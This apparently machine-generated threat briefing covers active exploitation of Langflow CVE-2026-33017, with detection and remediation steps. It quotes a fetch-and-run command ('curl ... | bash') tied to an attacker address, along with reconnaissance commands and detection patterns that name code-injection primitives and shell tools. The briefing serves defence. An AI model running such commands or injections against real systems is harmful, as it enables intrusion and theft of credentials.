@@ -1,0 +1,273 @@
+{
+  "briefing_id": "TB-2026-03-26-004",
+  "title": "Langflow AI Pipeline RCE CVE-2026-33017 (CVSS 9.3) Added to CISA KEV: Unauthenticated exec() Code Injection via Public Flow Build Endpoint Exploited Within 20 Hours of Disclosure — Attackers Harvesting LLM API Keys from Exposed Instances",
+  "generated_date": "2026-03-26",
+  "status": "ACTIVE",
+  "severity": {
+    "level": "Critical",
+    "cvss": 9.3,
+    "cisa_kev": true,
+    "cisa_deadline": "2026-04-15"
+  },
+  "cves": [
+    "CVE-2026-33017"
+  ],
+  "tags": [
+    "langflow",
+    "rce",
+    "ai-security",
+    "cisa-kev",
+    "unauthenticated",
+    "code-injection",
+    "python",
+    "llm",
+    "api-key-theft",
+    "zero-day"
+  ],
+  "affected_products": [
+    "Langflow versions up to and including 1.8.1",
+    "Any Langflow instance with at least one public flow exposed"
+  ],
+  "sources_analyzed": 12,
+  "sources": [
+    {
+      "name": "CISA Known Exploited Vulnerabilities Catalog — CVE-2026-33017",
+      "url": "https://www.cisa.gov/news-events/alerts/2026/03/25/cisa-adds-one-known-exploited-vulnerability-catalog",
+      "date": "2026-03-25",
+      "type": "Government"
+    },
+    {
+      "name": "Sysdig — CVE-2026-33017: How Attackers Compromised Langflow AI Pipelines in 20 Hours",
+      "url": "https://www.sysdig.com/blog/cve-2026-33017-how-attackers-compromised-langflow-ai-pipelines-in-20-hours",
+      "date": "2026-03-20",
+      "type": "Research"
+    },
+    {
+      "name": "The Hacker News — Critical Langflow Flaw CVE-2026-33017 Triggers Attacks Within 20 Hours of Disclosure",
+      "url": "https://thehackernews.com/2026/03/critical-langflow-flaw-cve-2026-33017.html",
+      "date": "2026-03-20",
+      "type": "News"
+    },
+    {
+      "name": "Barrack AI — Langflow Got Hacked Twice Through the Same exec() Call",
+      "url": "https://blog.barrack.ai/langflow-exec-rce-cve-2026-33017/",
+      "date": "2026-03-19",
+      "type": "Research"
+    },
+    {
+      "name": "Infosecurity Magazine — Hackers Exploit Critical Langflow Bug in Just 20 Hours",
+      "url": "https://www.infosecurity-magazine.com/news/hackers-exploit-critical-langflow/",
+      "date": "2026-03-20",
+      "type": "News"
+    },
+    {
+      "name": "SecPod — CVE-2026-33017: Critical Langflow Vulnerability Exploited Within 20 Hours of Disclosure",
+      "url": "https://www.secpod.com/blog/cve-2026-33017-critical-langflow-vulnerability-exploited-within-20-hours-of-disclosure/",
+      "date": "2026-03-20",
+      "type": "Research"
+    },
+    {
+      "name": "CSA Labs — Langflow RCE CVE-2026-33017: Exploited Within 20 Hours",
+      "url": "https://labs.cloudsecurityalliance.org/research/csa-research-note-cve-2026-33017-langflow-ai-pipeline-rce-20/",
+      "date": "2026-03-21",
+      "type": "Research"
+    },
+    {
+      "name": "CVEFeed — CVE-2026-33017 Technical Details",
+      "url": "https://cvefeed.io/vuln/detail/CVE-2026-33017",
+      "date": "2026-03-17",
+      "type": "Research"
+    },
+    {
+      "name": "Windows Forum — CISA Adds Langflow Code Injection Flaw to KEV Catalog",
+      "url": "https://windowsforum.com/threads/cisa-adds-langflow-code-injection-flaw-to-kev-catalog-act-fast.407252/",
+      "date": "2026-03-25",
+      "type": "News"
+    },
+    {
+      "name": "The Realist Juggernaut — Active Exploitation Confirmed: CISA Adds Langflow Code Injection Flaw to KEV Catalog",
+      "url": "https://therealistjuggernaut.com/2026/03/25/active-exploitation-confirmed-cisa-adds-langflow-code-injection-flaw-to-kev-catalog-signaling-immediate-risk-to-federal-and-private-systems/",
+      "date": "2026-03-25",
+      "type": "News"
+    },
+    {
+      "name": "Anavem — Langflow CVE-2026-33017 Exploited 20 Hours After Disclosure",
+      "url": "https://www.anavem.com/en/news/cybersecurity/langflow-cve-2026-33017-exploited-20-hours-after-disclosure",
+      "date": "2026-03-20",
+      "type": "News"
+    },
+    {
+      "name": "NVD — CVE-2026-33017 National Vulnerability Database",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-33017",
+      "date": "2026-03-17",
+      "type": "Government"
+    }
+  ],
+  "timeline": [
+    {
+      "date": "2026-03-17",
+      "event": "CVE-2026-33017 advisory published for Langflow, disclosing an unauthenticated remote code execution vulnerability in the public flow build endpoint with CVSS 9.3; Langflow 1.9.0 released as the patched version"
+    },
+    {
+      "date": "2026-03-18",
+      "event": "Within 20 hours of disclosure, Sysdig Threat Research Team observes first exploitation attempts in honeypot fleet — automated Nuclei scanners probe for vulnerable instances with pre-built exploit templates"
+    },
+    {
+      "date": "2026-03-18",
+      "event": "Over the next 48 hours, exploit events recorded from 6 unique source IPs; attackers progress from reconnaissance scanning to credential harvesting, exfiltrating OpenAI, Anthropic, and AWS API keys from compromised Langflow instances"
+    },
+    {
+      "date": "2026-03-20",
+      "event": "Multiple security firms publish detailed analyses; Sysdig documents three-phase attack pattern including automated scanning, credential theft, and stage-2 payload delivery attempts from dedicated attacker infrastructure"
+    },
+    {
+      "date": "2026-03-25",
+      "event": "CISA adds CVE-2026-33017 to Known Exploited Vulnerabilities (KEV) catalog, confirming active exploitation and mandating federal agency remediation"
+    },
+    {
+      "date": "2026-03-26",
+      "event": "Exploitation continues with increasing sophistication; organizations running internet-exposed Langflow instances without authentication are actively targeted for LLM API key theft and potential lateral movement into connected cloud infrastructure"
+    }
+  ],
+  "simple_summary": {
+    "what_happened": "A critical security vulnerability was discovered in Langflow, a popular open-source tool for building AI application workflows and chatbots. The flaw allows anyone on the internet to execute arbitrary code on a Langflow server by sending a single HTTP request — no password, no authentication, nothing. Within just 20 hours of the vulnerability being publicly disclosed on March 17, attackers had already built automated tools to find and exploit vulnerable Langflow instances across the internet. They primarily targeted the AI API keys (OpenAI, Anthropic, AWS) stored in these systems, which can be used to run up massive bills or access sensitive AI-powered services. CISA added this vulnerability to its mandatory-patch list on March 25, 2026, confirming ongoing active exploitation.",
+    "who_is_affected": "Organizations running Langflow version 1.8.1 or earlier that have at least one public flow configured — which is the default setup for any Langflow deployment serving a chatbot or AI workflow. Langflow is widely used by AI teams, startups, and enterprises to build LLM-powered applications, RAG pipelines, and conversational AI agents. Any instance accessible from the internet without additional network-level protections is vulnerable. The risk is highest for organizations that store LLM provider API keys (OpenAI, Anthropic, Google, AWS Bedrock) directly in their Langflow configurations.",
+    "what_attackers_do": "Step 1: The attacker identifies an internet-exposed Langflow instance and discovers the UUID of a public flow — this is trivially obtained from any shared chatbot URL or by browsing the Langflow interface. Step 2: The attacker sends a single POST request to the /api/v1/build_public_tmp/{flow_id}/flow endpoint with a crafted JSON payload containing arbitrary Python code embedded in a node definition's data parameter — this endpoint requires zero authentication. Step 3: Langflow's backend passes the attacker-controlled Python code directly to Python's exec() function with no sandboxing, input validation, or security controls — the code executes immediately with the full permissions of the Langflow server process. Step 4: In the observed attacks, attackers first run reconnaissance commands (id, ls -al /root, cat /etc/passwd) to fingerprint the system, then systematically search for and exfiltrate LLM API keys, environment variables, database credentials, and cloud provider tokens stored in the Langflow configuration and environment. Step 5: Advanced attackers attempt to deliver second-stage payloads by downloading and executing remote scripts (e.g., curl http://attacker-ip:8443/z | bash), establishing persistent access for further exploitation of the connected cloud infrastructure and downstream AI services.",
+    "what_you_should_do": [
+      "Immediately upgrade Langflow to version 1.9.0 or later — this is the only complete fix for CVE-2026-33017 and the related CVE-2026-33309",
+      "If immediate upgrade is not possible, take Langflow instances offline or place them behind a VPN or reverse proxy with authentication until patching is complete — do not leave any Langflow instance directly exposed to the internet",
+      "Rotate all LLM API keys (OpenAI, Anthropic, Google, AWS Bedrock, Azure OpenAI) and any other credentials stored in Langflow configurations or environment variables on the same server",
+      "Review Langflow server access logs for POST requests to /api/v1/build_public_tmp/ endpoints — any requests with a data parameter containing Python code like __import__, exec, eval, os.system, or subprocess indicate exploitation attempts",
+      "Audit cloud provider billing for unauthorized LLM API usage that may indicate stolen keys are being used by attackers to generate content or perform inference at your expense"
+    ],
+    "why_this_is_serious": "The speed of exploitation — 20 hours from disclosure to active attacks — demonstrates how rapidly threat actors weaponize vulnerabilities in AI infrastructure. The vulnerability requires zero authentication and a single HTTP request, making it trivially exploitable at scale. Langflow instances are high-value targets because they typically store API keys for expensive LLM services (OpenAI, Anthropic, AWS) and may have access to sensitive data through RAG pipelines connected to internal databases and document stores. A compromised Langflow instance can serve as a pivot point into the broader cloud environment. The use of exec() without any sandboxing represents a fundamental security design flaw — this is the second time Langflow has been exploited through the same exec() call pattern, raising concerns about the security maturity of rapidly-growing AI tooling. CISA's KEV addition confirms this is being actively exploited against real organizations."
+  },
+  "mitre_attack": {
+    "tactics": [
+      {
+        "tactic": "Initial Access",
+        "technique_id": "T1190",
+        "technique_name": "Exploit Public-Facing Application",
+        "description": "Attackers exploit the unauthenticated /api/v1/build_public_tmp endpoint in Langflow to achieve remote code execution on internet-facing instances without any credentials"
+      },
+      {
+        "tactic": "Execution",
+        "technique_id": "T1059.006",
+        "technique_name": "Command and Scripting Interpreter: Python",
+        "description": "The exploit injects arbitrary Python code into Langflow's flow build process, which is passed directly to exec() for execution with the server process permissions and no sandboxing"
+      },
+      {
+        "tactic": "Discovery",
+        "technique_id": "T1082",
+        "technique_name": "System Information Discovery",
+        "description": "Observed attackers run reconnaissance commands (id, ls -al, cat /etc/passwd) to enumerate the target system, identify the Langflow user context, and map accessible files and directories"
+      },
+      {
+        "tactic": "Credential Access",
+        "technique_id": "T1552.001",
+        "technique_name": "Unsecured Credentials: Credentials In Files",
+        "description": "Attackers harvest LLM API keys (OpenAI, Anthropic, AWS), environment variables, and database credentials stored in Langflow configuration files and the server environment"
+      },
+      {
+        "tactic": "Command and Control",
+        "technique_id": "T1105",
+        "technique_name": "Ingress Tool Transfer",
+        "description": "Advanced attackers download second-stage payloads from external servers (observed: curl http://173.212.205.251:8443/z) to establish persistent access and deploy additional tooling on the compromised Langflow instance"
+      }
+    ]
+  },
+  "detection_guidance": {
+    "summary": "Detection focuses on identifying exploitation attempts via web server access logs (POST requests to the public flow build endpoint with code injection payloads), monitoring for anomalous process execution from the Langflow server process, and detecting credential exfiltration through unusual outbound network connections. Given the 20-hour exploitation timeline, proactive scanning for vulnerable instances is essential.",
+    "log_sources": [
+      {
+        "source": "Web Server / Reverse Proxy Access Logs",
+        "description": "Primary detection source — monitor for POST requests to /api/v1/build_public_tmp/ endpoints, particularly those with large request bodies containing Python code patterns in the data parameter",
+        "priority": "Critical"
+      },
+      {
+        "source": "Langflow Application Logs",
+        "description": "Application-level logs may capture errors from malicious code execution attempts, unusual flow build activity for public flows, and authentication bypass events",
+        "priority": "High"
+      },
+      {
+        "source": "Endpoint Detection / Process Monitoring",
+        "description": "Monitor for child processes spawned by the Langflow Python process that indicate exploitation — shell commands (sh, bash, curl, wget), reconnaissance tools, and file access to sensitive credential directories",
+        "priority": "Critical"
+      },
+      {
+        "source": "Network Traffic / Cloud Provider Logs",
+        "description": "Detect outbound connections from Langflow servers to unexpected destinations, unusual LLM API usage patterns indicating stolen keys, and connections to known attacker infrastructure",
+        "priority": "High"
+      }
+    ],
+    "what_to_look_for": [
+      {
+        "indicator": "POST request to /api/v1/build_public_tmp/{uuid}/flow with Python code in request body",
+        "description": "Core exploit indicator — the request body contains a JSON payload with arbitrary Python code embedded in node definitions that will be passed to exec(). Look for patterns like __import__, exec, eval, os.system, subprocess, or base64 in the data parameter",
+        "log_field": "request='POST /api/v1/build_public_tmp/*/flow' AND body contains '__import__|exec|eval|os.system|subprocess|base64'",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Nuclei scanner user-agent or cookie header containing client_id=nuclei-scanner",
+        "description": "Automated exploitation scanning observed using Project Discovery's Nuclei with CVE-2026-33017 templates — the scanner includes identifying markers in HTTP headers that can be detected at the WAF or reverse proxy level",
+        "log_field": "cookie contains 'nuclei-scanner' OR user_agent contains 'nuclei'",
+        "severity": "High"
+      },
+      {
+        "indicator": "Shell process spawned as child of Langflow Python process",
+        "description": "Post-exploitation activity generates child shell processes (sh, bash) from the Langflow uvicorn/gunicorn worker — any shell execution from the web application process is abnormal and indicates active exploitation",
+        "log_field": "process_parent='python*' AND process_name IN ['sh','bash','curl','wget'] AND parent_cmdline contains 'langflow'",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Outbound connection from Langflow server to attacker C2 infrastructure",
+        "description": "Observed attacker IP 173.212.205.251 hosting stage-2 payloads on port 8443; also watch for connections to interactsh callback servers used for data exfiltration during the scanning phase",
+        "log_field": "src_process contains 'langflow' AND dst_ip='173.212.205.251' OR dst_domain contains 'interactsh'",
+        "severity": "Critical"
+      },
+      {
+        "indicator": "Unusual LLM API consumption spike from Langflow-associated API keys",
+        "description": "Stolen API keys may be used for unauthorized inference — monitor OpenAI, Anthropic, and AWS Bedrock usage dashboards for unexpected spikes in API calls, token consumption, or requests from unfamiliar IP addresses",
+        "log_field": "api_key IN langflow_configured_keys AND src_ip NOT IN expected_ranges",
+        "severity": "High"
+      }
+    ],
+    "known_malicious_ips": [
+      "205.237.106.117",
+      "83.98.164.238",
+      "173.212.205.251"
+    ]
+  },
+  "immediate_actions": [
+    {
+      "priority": 1,
+      "action": "Upgrade Langflow to version 1.9.0 immediately",
+      "description": "Langflow 1.9.0 fixes both CVE-2026-33017 and CVE-2026-33309. This is the only complete remediation. If running via pip, upgrade with pip install langflow>=1.9.0. If running via Docker, pull the latest image. Verify the upgrade by checking the version endpoint.",
+      "command": "pip install langflow>=1.9.0 && langflow --version"
+    },
+    {
+      "priority": 2,
+      "action": "Take unpatched Langflow instances offline or restrict access immediately",
+      "description": "If immediate patching is not possible, take Langflow offline or place it behind a VPN, firewall, or reverse proxy with authentication. Block all external access to /api/v1/build_public_tmp/ endpoints at the WAF or reverse proxy level as an interim measure.",
+      "command": null
+    },
+    {
+      "priority": 3,
+      "action": "Rotate all LLM API keys and credentials stored in Langflow",
+      "description": "Immediately rotate all API keys for OpenAI, Anthropic, Google AI, AWS Bedrock, Azure OpenAI, and any other LLM providers configured in Langflow. Also rotate database credentials, environment variables, and any other secrets accessible from the Langflow server environment.",
+      "command": null
+    },
+    {
+      "priority": 4,
+      "action": "Hunt for exploitation indicators in access logs and process history",
+      "description": "Search web server access logs for POST requests to /api/v1/build_public_tmp/ with suspicious payloads. Check for known scanner signatures (nuclei-scanner cookie). Review process execution logs for shell commands spawned by the Langflow process. Check for connections to known attacker IPs.",
+      "command": "grep -r 'build_public_tmp' /var/log/nginx/access.log /var/log/apache2/access.log 2>/dev/null; grep -r 'nuclei-scanner' /var/log/nginx/access.log 2>/dev/null"
+    },
+    {
+      "priority": 5,
+      "action": "Audit cloud provider billing for unauthorized LLM API usage",
+      "description": "Check OpenAI, Anthropic, AWS, and Azure billing dashboards for unexpected usage spikes that may indicate stolen API keys are being used by attackers. Set up billing alerts and API key usage monitoring to detect future unauthorized access.",
+      "command": null
+    }
+  ]
+}
